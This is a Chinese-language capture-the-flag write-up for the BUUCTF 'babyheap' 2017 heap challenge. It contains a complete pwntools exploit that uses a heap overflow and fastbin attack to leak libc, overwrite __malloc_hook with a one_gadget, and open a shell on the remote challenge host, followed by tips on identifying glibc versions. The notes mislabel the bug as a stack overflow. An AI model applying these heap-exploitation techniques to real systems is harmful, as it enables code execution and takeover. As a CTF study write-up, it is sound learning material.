## BUUCTF_babyheap-2017

### 思路

* 这道题目就是一道简单的栈溢出，通过溢出到已经释放过的已经进入fastbin或者unsortedbin中的fd，来改变fastbin的链表情况

* 然后这样就可以leak出fd（也就是指向main——areor附近的）
* 获得libc
* 漏洞利用
* 👉绷不住的一个，我真的服了，下一次调试不出来的时候（本地），就打打远程看看反应，有时候是本地的配置问题

### Exp

> * python
>
>   `from pwn import*`
>   `context.terminal = ['tmux', 'splitw', '-h']`
>   `context (os='linux', arch='amd64', log_level='debug')`
>   `#p = process('./babyheap')`
>   `p = remote('node5.buuoj.cn','26367')`
>   `libc = ELF('./libc-2.23.so')`
>   `#gdb.attach(p)`
>   `def alloc(size):`
>       `p.sendlineafter('Command: ',str(1).encode())`
>       `p.sendlineafter('Size: ',str(size).encode())`
>
>   `def fill(index,size,content):`
>       `p.sendlineafter('Command: ',str(2).encode())`
>       `p.sendlineafter('Index: ',str(index).encode())`
>       `p.sendlineafter('Size: ',str(size).encode())`
>       `p.sendlineafter('Content: ',content)`
>
>   `def free(index):`
>       `p.sendlineafter('Command: ',str(3).encode())`
>       `p.sendlineafter('Index: ',str(index).encode())`
>
>   `def dump(index):`
>       `p.sendlineafter('Command: ',str(4).encode())`
>       `p.sendlineafter('Index: ',str(index).encode())`
>
>   `#果然每一步都是环环相扣，他那样写一定又他那样写的原因`
>   `alloc(0x10)`
>   `alloc(0x10)`
>   `alloc(0x10)`
>   `alloc(0x10)`
>   `alloc(0x90)`
>   `free(2)`
>   `free(1)`
>   `payload1 = b'a'* 0x10 + p64(0) + p64(0x21) + b'\x80'`
>   `fill(0,0x28 - 0x7,payload1)`
>   `payload2 = b'a'* 0x10 + p64(0) + p64(0x21)`
>   `fill(3,0x20,payload2)`
>   `alloc(0x10)`
>   `alloc(0x10)`
>   `#alloc(0x90)#这个是块6`
>   `payload3 = b'a'* 0x10 + p64(0) + p64(0xa1)`
>   `fill(3,0x20,payload3)`
>   `alloc(0x90)`
>   `free(4)`
>   `dump(2)`
>   `p.recvuntil('Content: \n')`
>   `main_arear_base = u64(p.recv(6).ljust(8,b'\x00'))`
>   `main_arear_base = main_arear_base - 88`
>   `print('main_arear_base = '+hex(main_arear_base))`
>   `hook_offect = libc.symbols['__malloc_hook']`
>   `libc_base = main_arear_base - hook_offect - 0x10`
>   `print('libc_base = ' + hex(libc_base))`
>   `alloc(0x60)`
>   `free(4)`
>   `payload = p64(libc_base + 0x3c4aed)`
>   `print('要填充的值 = ' + hex(libc_base + 0x3c4aed))`
>   `fill(2,len(payload),payload)`
>   `alloc(0x60)`
>   `alloc(0x60)`
>   `payload = p8(0)*3    
>   payload += p64(0)*2`
>   `payload += p64(libc_base+0x4526a)`
>   `fill(6,len(payload),payload)`
>   `alloc(255)`
>   `p.interactive()`
>
> ### 难点
>

#### 1，环境难点

- 这个题目只是给了elf文件，无法确定其使用的libc版本

  我们使用

  bash：	`strings ./your_elf |grep GLIBC`

  可以看到这个这个elf文件的使用的libc版本的情况

  | 输出结果               | 意味着什么                                                   |
  | ---------------------- | ------------------------------------------------------------ |
  | **只有 2.2.5 / 2.4**   | 这是老题（2017以前）。**绝对没有 tcache**。堆管理非常单纯，适合玩 Fastbin Attack。 |
  | **出现了 2.26 / 2.27** | 引入了 **tcache**。释放块会优先进 tcache，Double Free 检查变得严格。 |
  | **出现了 2.31 / 2.32** | 引入了 **Safe Linking**（指针加密）。你会看到堆指针变成了类似 `0x91` 这种乱码。 |

- 然后使用如下方式给elf文件链接到通过all-in-one下载的ld和libc，其实使用pwninit就行

  `pwninit  --bin  ./your_elf  --libc   ./your_libc  --ld  ./your_ld`
